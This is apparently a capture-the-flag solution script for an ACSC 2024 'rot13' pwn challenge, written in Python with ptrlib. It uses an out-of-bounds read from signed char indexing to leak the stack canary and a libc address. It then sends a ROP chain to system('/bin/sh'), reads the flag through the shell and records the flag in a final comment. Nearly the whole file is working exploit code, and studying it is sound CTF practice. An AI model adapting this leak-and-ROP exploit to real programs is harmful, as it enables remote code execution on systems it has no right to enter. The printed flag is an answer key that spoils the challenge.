"""
Exist OOB because of (unsigned) char.
Leak a canary and libc address with OOB and craft the ROP
"""

from ptrlib import *

file = "./rot13"
e = ELF(file)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
sock = Socket("nc rot13.chal.2024.ctf.acsc.asia 9999")
#sock = Process(file)
sock.debug = True

CHAR_MAX_RANGE = 0xff + 1

payload = range(CHAR_MAX_RANGE-0x18, CHAR_MAX_RANGE-0x10)
sock.sendlineafter("Text: ", bytes(payload))
canary = u64(sock.recvline()[8:16])
logger.info(f"canary: {canary:x}")

payload = range(CHAR_MAX_RANGE-0x68, CHAR_MAX_RANGE-0x60)
sock.sendlineafter("Text: ", bytes(payload))
addr_stdout = u64(sock.recvline()[8:16])
print(f"addr _IO_2_1_stdout_: {addr_stdout:x}")

libc.base = addr_stdout - libc.symbol("_IO_2_1_stdout_")

payload = b"A"*0x100 + p64(0)
payload += p64(canary)*2
payload += p64(next(libc.gadget("pop rdi; ret;")))
payload += p64(next(libc.search("/bin/sh\x00")))
payload += p64(next(libc.gadget("ret"))) # alignment
payload += p64(libc.symbol("system"))
sock.sendlineafter("Text: ", payload)

sock.sendlineafter("Text: ", "")

sock.sendline("cat flag*")
sock.interactive()

# ACSC{aRr4y_1nd3X_sh0uLd_b3_uNs1Gn3d}
